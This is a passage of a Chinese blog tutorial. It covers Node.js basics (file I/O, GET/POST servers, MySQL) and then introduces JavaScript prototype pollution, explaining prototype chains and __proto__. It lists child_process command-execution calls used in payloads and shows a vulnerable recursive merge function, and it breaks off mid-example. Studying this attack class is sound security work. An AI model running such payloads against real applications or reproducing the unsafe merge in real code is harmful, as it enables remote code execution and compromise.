的属性 也是全局变量有四个事件<br>exit before uncaughException Signal</p><h2 id="十二、文件-异步"><a href="#十二、文件-异步" class="headerlink" title="十二、文件-异步"></a>十二、文件-异步</h2><p>导入文件系统模块<br><code>var fs = require(&quot;fs&quot;)</code></p><ul><li>读取 input.txt</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">fs.read<span class="hljs-constructor">File(&#x27;<span class="hljs-params">input</span>.<span class="hljs-params">txt</span>&#x27;, <span class="hljs-params">function</span> (<span class="hljs-params">err</span>, <span class="hljs-params">data</span>)</span> &#123;<br>   <span class="hljs-keyword">if</span> (err) &#123;<br>       return console.error(err);<br>   &#125;<br>   console.log(<span class="hljs-string">&quot;异步读取: &quot;</span> + data.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>类似地有函数：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">打开<br>fs<span class="hljs-selector-class">.open</span>(path, flags<span class="hljs-selector-attr">[, mode]</span>, callback)<span class="hljs-comment">//(flags:r r+ a a+ ......)</span><br><br>写入<br>fs<span class="hljs-selector-class">.writeFile</span>(file, data<span class="hljs-selector-attr">[, options]</span>, callback)<br><br>读取<br>fs<span class="hljs-selector-class">.read</span>(fd, buffer, offset, length, <span class="hljs-attribute">position</span>, callback)<br><br>关闭<br>fs<span class="hljs-selector-class">.close</span>(fd, callback)<br><br>删除<br>fs<span class="hljs-selector-class">.unlink</span>(path, callback)<br><br>还有目录...<br></code></pre></td></tr></table></figure><h2 id="十三、GET-POST-请求"><a href="#十三、GET-POST-请求" class="headerlink" title="十三、GET/POST 请求"></a>十三、GET/POST 请求</h2><p>获取 get 请求的参数</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-built_in">url</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;url&#x27;</span>);<br><span class="hljs-keyword">var</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;<br>    res.writeHead(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain; charset=utf-8&#x27;</span>&#125;);<br>    res.end(util.inspect(<span class="hljs-built_in">url</span>.parse(req.url, <span class="hljs-literal">true</span>)));<br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure><p>获取 url 的参数</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-built_in">url</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;url&#x27;</span>);<br><span class="hljs-keyword">var</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;<br>    res.writeHead(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span>&#125;);<br><br>    <span class="hljs-comment">// 解析 url 参数</span><br>    <span class="hljs-keyword">var</span> params = <span class="hljs-built_in">url</span>.parse(req.url, <span class="hljs-literal">true</span>).query;<br>    res.write(<span class="hljs-string">&quot;网站名：&quot;</span> + params.name);<br>    res.write(<span class="hljs-string">&quot;\n&quot;</span>);<br>    res.write(<span class="hljs-string">&quot;网站 URL：&quot;</span> + params.url);<br>    res.end();<br><br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure><p>获取 post 的内容</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> querystring = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;querystring&#x27;</span>);<br><span class="hljs-keyword">var</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;<br>    <span class="hljs-comment">// 定义了一个post变量，用于暂存请求体的信息</span><br>    <span class="hljs-keyword">var</span> post = <span class="hljs-string">&#x27;&#x27;</span>;<br><br>    <span class="hljs-comment">// 通过req的data事件监听函数，每当接受到请求体的数据，就累加到post变量中</span><br>    req.on(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">chunk</span>)</span>&#123;<br>        post += chunk;<br>    &#125;);<br><br>    <span class="hljs-comment">// 在end事件触发后，通过querystring.parse将post解析为真正的POST请求格式，然后向客户端返回。</span><br>    req.on(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        post = querystring.parse(post);<br>        res.end(util.inspect(post));<br>    &#125;);<br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure><p>提交 post 表单</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> querystring = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;querystring&#x27;</span>);<br><br><span class="hljs-keyword">var</span> postHTML =<br>  <span class="hljs-string">&#x27;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;Node.js 实例&lt;/title&gt;&lt;/head&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;body&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;form method=&quot;post&quot;&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;网站名： &lt;input name=&quot;name&quot;&gt;&lt;br&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;网站 URL： &lt;input name=&quot;url&quot;&gt;&lt;br&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;input type=&quot;submit&quot;&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;/form&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;/body&gt;&lt;/html&gt;&#x27;</span>;<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> body = <span class="hljs-string">&quot;&quot;</span>;<br>  req.on(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">chunk</span>) </span>&#123;<br>    body += chunk;<br>  &#125;);<br>  req.on(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">// 解析参数</span><br>    body = querystring.parse(body);<br>    <span class="hljs-comment">// 设置响应头部信息及编码</span><br>    res.writeHead(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/html; charset=utf8&#x27;</span>&#125;);<br><br>    <span class="hljs-keyword">if</span>(body.name &amp;&amp; body.url) &#123; <span class="hljs-comment">// 输出提交的数据</span><br>        res.write(<span class="hljs-string">&quot;网站名：&quot;</span> + body.name);<br>        res.write(<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);<br>        res.write(<span class="hljs-string">&quot;网站 URL：&quot;</span> + body.url);<br>    &#125; <span class="hljs-keyword">else</span> &#123;  <span class="hljs-comment">// 输出表单</span><br>        res.write(postHTML);<br>    &#125;<br>    res.end();<br>  &#125;);<br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure><h2 id="十四、Express-框架"><a href="#十四、Express-框架" class="headerlink" title="十四、Express 框架"></a>十四、Express 框架</h2><p>利用 Express 框架<br>实现 GEt 方法提交两个参数和 POST 方法提交两个参数<br>完成文件上传 要本地安装 multer 模块 在目录下能看到上传的文件<br>对 cookie 进行管理 要本地安装 cookie-parser 模块 在服务终端能看到 cookie 信息</p><h2 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h2><p>以 mysql 为例<br>在一项目中 test.js 文件是 nodejs 与 mysql 的配置信息</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">var mysql      = require(<span class="hljs-string">&#x27;mysql&#x27;</span>);<br>var <span class="hljs-keyword">connection</span> = mysql.createConnection(&#123;<br>  host     : <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>  <span class="hljs-keyword">user</span>     : <span class="hljs-string">&#x27;root&#x27;</span>,<br>  <span class="hljs-keyword">password</span> : <span class="hljs-string">&#x27;root&#x27;</span>,<br>  <span class="hljs-keyword">database</span> : <span class="hljs-string">&#x27;test&#x27;</span><br>&#125;);<br><br><span class="hljs-keyword">connection</span>.<span class="hljs-keyword">connect</span>();<br><br><span class="hljs-keyword">connection</span>.query(<span class="hljs-string">&#x27;SELECT 1 + 1 AS solution&#x27;</span>, <span class="hljs-keyword">function</span> (error, results, fields) &#123;<br>  <span class="hljs-keyword">if</span> (error) throw error;<br>  console.log(<span class="hljs-string">&#x27;The solution is: &#x27;</span>, results[<span class="hljs-number">0</span>].solution);<br>&#125;);<br></code></pre></td></tr></table></figure><p>如果成功连接数据库的话 输出 2</p><p>可以在其他 js 中查询数据库的信息<br>以查一个表为例 数据库可以自行创建</p><p>启动数据库 查一下<br>然后用 sql.js 查一下 所以可以通过修改<br>里面的 sql=’查询语句’就可以进行数据库操作了</p><p>项目</p><p>也可以 nodejs 安装 MongoDB 来对数据库进行操作</p><h1 id="Prototype-Pollution-Attack"><a href="#Prototype-Pollution-Attack" class="headerlink" title="Prototype Pollution Attack"></a>Prototype Pollution Attack</h1><p>常用的执行函数</p><blockquote><p>require(‘child_process’).spawnSync(‘ls’,[‘.’]).stdout.toString()</p><p>stdout 用来捕获输出</p><p>还有 exec，execSync，spawn，spawnSync(这两个需要 stdout 来捕获输出)</p></blockquote><h2 id="JavaScript-中的对象"><a href="#JavaScript-中的对象" class="headerlink" title="JavaScript 中的对象"></a>JavaScript 中的对象</h2><h3 id="建立对象"><a href="#建立对象" class="headerlink" title="建立对象"></a>建立对象</h3><p>JavaScript 中 建立对象有两种形式</p><ul><li>构造函数创建</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">student</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;Yuyan Peng&quot;</span>;<br>    <span class="hljs-built_in">this</span>.test = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2333</span>;<br>    &#125;<br>&#125;<br>student.prototype.a=<span class="hljs-number">3</span>;<br>stu = <span class="hljs-keyword">new</span> student();<br><span class="hljs-built_in">console</span>.log(stu.test());<br><span class="hljs-built_in">console</span>.log(stu.a);<br></code></pre></td></tr></table></figure><ul><li>通过 Object 创建</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>();<br>a.c=<span class="hljs-number">3</span><br><span class="hljs-built_in">console</span>.log(a.c)<br></code></pre></td></tr></table></figure><p>对于使用过基于类的语言 (如 Java 或 C++) 的开发人员来说，JavaScript 有点令人困惑，因为它是动态的，并且本身不提供一个 class 实现。（在 ES2015/ES6 中引入了 class 关键字，但那只是语法糖，JavaScript 仍然是基于原型的）。 之前我们所认为的类在 js 中都是用函数来声明的 （事实上 js 不承认类 只是有相应的概念而已 下面为了说明方便 都沿用类的说法） 举个栗子</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">function test（）&#123;<br>    this.a = <span class="hljs-string">&quot;joy&quot;</span><span class="hljs-comment">;</span><br>&#125;<br><br><span class="hljs-attribute">b</span> = new test<span class="hljs-comment">;</span><br>console.log(b.a)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>从上面可以看到 实例化对象 b 后就可以输出 test 类的属性 a 了 我们其实很容易想到构造函数 构造函数就是在 new 一个对象的时候被调用 在这其实就是 js 的一个重要概念——继承，继承的整个对应关系就是这个对象的原型链 所以 <code>test()函数就是类test的构造函数</code></p><p>上面没问题我们继续：</p><h3 id="prototype-和proto"><a href="#prototype-和proto" class="headerlink" title="prototype 和proto"></a>prototype 和<strong>proto</strong></h3><p>一个类中必定有一些方法比如说属性 this.age 把方法定义在构造函数内部：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">student</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.age=<span class="hljs-number">19</span>;<br>    <span class="hljs-built_in">this</span>.show=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.age)<br>        &#125;<br>    &#125;<br><br>(<span class="hljs-keyword">new</span> student).show();<br></code></pre></td></tr></table></figure><p>再一次看到 new 一个对象就会继承到它的属性 在新开辟的存储空间就已经存放有对应的属性了</p><p>但这样写有一个问题 每当我需要创建一个 student 对象的时候 this.show = function{…}就会执行一次 这个 show 方法是绑定在对象上的 而不是绑定在“类”上的</p><ul><li><input checked="" disabled="" type="checkbox"> prototype<pre><code>用原型 prototype 实现</code></pre></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Student</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.age=<span class="hljs-number">19</span>;<br>&#125;<br><br>Student.prototype.show = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.age)&#125;<br><br><span class="hljs-keyword">var</span> stu = <span class="hljs-keyword">new</span> Student;<br>stu.show();<br></code></pre></td></tr></table></figure><p>prototype 是类 Student 的一个属性 所有类对象在实例化后都具有和 prototype 中的变量、属性和方法 同时只有类才有 prototype 属性，但是类<code>实例化出来的对象</code>却没有 prototype 不能通过 prototype 访问实例化对象的原型</p><ul><li><input checked="" disabled="" type="checkbox"> __proto__<pre><code>就上例而言 我们可以通过 Student.prototype 访问 Student 类的原型 但是实例化后的对象 stu 是不能通过 prototype 访问原型的 这时候我们使用\_\_proto\_\_来访问实例化对象的原型 stu.\_\_proto\_\_==Student.prototype 看到二者是等价的</code></pre></li></ul><p><strong>在 Java.Script 中 万物皆对象</strong><br>所有的变量，函数，数组，对象都始于 Object 的原型即 Object.prototype 对象的__proto__和类的 prototype 相对应</p><p>特别的 函数也可以使用__proto__因为函数也是对象 后面给予说明</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/n.png"></p><h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p>在 javascript 中 每个对象的都有一个指向他的原型(prototype)的内部链接 这个原型对象又有它自己的原型，直到 null 为止</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> <span class="hljs-constructor">Pt()</span>&#123;<br>    this.b = <span class="hljs-string">&quot;I don&#x27;t know what I&#x27;m up to.&quot;</span><br>&#125;<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Pt</span>.</span></span>prototype;<br><br>var ppt = <span class="hljs-keyword">new</span> Pt;<br>ppt.__proto__;<br>ppt.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__proto__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__proto__</span>;</span></span><br><br></code></pre></td></tr></table></figure><p>可以看出原型链为 ppt-&gt;Pt.prototype-&gt;Object.prototype-&gt;null</p><p>数组<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE2.png"><br>原型链 c-&gt;array.prototype-&gt;Object.prototype-&gt;null<br>函数<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE3.png"><br>原型链 d-&gt;function.prototype-&gt;Object.prototype-&gt;null</p><p>可见 js 中一切皆对象 一切都始于 Object.prototype</p><p>总结一下：</p><ul><li>prototype 是类的属性 所有类对象实例化都会从 prototype 继承属性和方法</li><li>一个对象的__proto__属性指向这个实例化这个对象的类的 prototype 属性</li></ul><p><code>instanceof运算符</code>，它可以用来判断某个构造函数的 prototype 属性是否存在另外一个要检测对象的原型链，下面是 instanceof 运算符的一个实例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Pt</span>(<span class="hljs-params"></span>)</span>&#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Ob</span>(<span class="hljs-params"></span>)</span>&#123;&#125;<br><br><span class="hljs-keyword">var</span> ppt = <span class="hljs-keyword">new</span> Pt;<br><span class="hljs-built_in">console</span>.info(ppt <span class="hljs-keyword">instanceof</span> Pt)<span class="hljs-comment">//true //ppt.__proto__===Pt.prototype</span><br><span class="hljs-built_in">console</span>.info(ppt <span class="hljs-keyword">instanceof</span> ob)<span class="hljs-comment">//false 因为对象ppt的原型不是Ob</span><br></code></pre></td></tr></table></figure><p>上面说到函数也是一个对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.test = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;hello world&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2333</span>;<br>    &#125;<br><br><span class="hljs-keyword">var</span> lib = <span class="hljs-keyword">new</span> hello;<br>lib.test();<br><br><span class="hljs-built_in">console</span>.log(hello <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Object</span>)<span class="hljs-comment">//ture 得证</span><br></code></pre></td></tr></table></figure><h3 id="原型链的变量搜索"><a href="#原型链的变量搜索" class="headerlink" title="原型链的变量搜索"></a>原型链的变量搜索</h3><p>来看一个例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">I</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.a = <span class="hljs-string">&quot;abc&quot;</span>;<br>    <span class="hljs-built_in">this</span>.b = <span class="hljs-string">&quot;123&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">var</span> j = <span class="hljs-keyword">new</span>(I);<br>I.prototype.c = <span class="hljs-string">&quot;789&quot;</span>;<br><span class="hljs-built_in">console</span>.log(j.c);<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211119005530731.png" alt="image-20211119005530731"><br>能看出什么</p><p>实例化 I 后，对象 j 不应该有属性 c，但此时给类对象 I 新增一个属性时，在 j 中也有了 c 属性，这是类与对象中从未见过的</p><p>当要使用或输出一个变量时：首先会在本层中搜索相应的变量，如果不存在的话，就会向上搜索，即在自己的父类中搜索，当父类中也没有时，就会向祖父类搜索，直到指向 null，如果此时还没有搜索到，就会返回 undefined</p><p>那么此时的原型链就是 j-&gt;I.prototype-&gt;Object.prototype-&gt;null</p><p>js 的这个查找机制 就是运用在面向对象的继承中 称作 prototype 继承链</p><p>⭐ 说到这里再一次总结如下</p><ul><li>每个构造函数(constructor)都有一个原型对象(prototype)</li><li>对象的__proto__属性，指向类的原型对象 prototype</li><li>JavaScript 使用 prototype 链实现继承机制</li></ul><h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>下面我们来看</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">var Student = &#123;age:<span class="hljs-number">19</span>&#125;<br><br>console.log(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Student</span>.</span></span>age)<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Student</span>.</span><span class="hljs-module"><span class="hljs-identifier">__proto__</span>.</span></span>age = <span class="hljs-number">20</span><br><br>console.log(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Student</span>.</span></span>age)<br><br>var Teacher = &#123;&#125;<br><br>console.log(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Teacher</span>.</span></span>age)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.png"></p><p>原型链：Student.__proto__-&gt;Object.prototype-&gt;null</p><p>随着上面的逐步探讨 原型链污染及其产生的漏洞也就呼之欲出了 我们通过控制父类甚至祖类的属性(修改这个对象的原型)就可以影响来自同一个类、父祖类的对象 这就是原型链污染</p><p>看一个例子</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">//First.a或者First[&#x27;a&#x27;]对数组元素的访问</span><br><span class="hljs-number">1.</span><br><span class="hljs-keyword">var</span> <span class="hljs-built_in">First</span> = Array();<br><span class="hljs-built_in">First</span>[<span class="hljs-string">&#x27;aa&#x27;</span>] = <span class="hljs-string">&quot;aaa&quot;</span>;<br><span class="hljs-built_in">First</span>[<span class="hljs-string">&#x27;bb&#x27;</span>] = <span class="hljs-string">&quot;bbb&quot;</span>;<br><span class="hljs-built_in">First</span>.aa<br><span class="hljs-built_in">First</span>.bb<br><br><span class="hljs-number">2.</span><br><span class="hljs-keyword">var</span> <span class="hljs-built_in">Second</span> = &#123;<span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quot;ccc&quot;</span>,<span class="hljs-string">&quot;d&quot;</span>:<span class="hljs-string">&quot;ddd&quot;</span>&#125;<br>typeof <span class="hljs-built_in">Second</span>;<br><span class="hljs-built_in">Second</span>.c<br><span class="hljs-built_in">Second</span>[<span class="hljs-string">&#x27;c&#x27;</span>]<br></code></pre></td></tr></table></figure><p>上面的 prototype 是一样的<br>看一组 Second.__proto__==Second[“__proto__“]=Object.prototype</p><p>所以说，原型链污染一般会出现在对象、或数组的键名或属性名可控,而且是赋值语句的情况下 下面是个失败案例</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">function <span class="hljs-keyword">merge</span>(target, source)&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> source)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> source &amp;&amp; <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> target)&#123;<br>            <span class="hljs-keyword">merge</span>(target[<span class="hljs-keyword">key</span>], source[<span class="hljs-keyword">key</span>])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>                target[<span class="hljs-keyword">key</span>] = source[<span class="hljs-keyword">key</span>]<br>        &#125;<br>     &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>试一下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 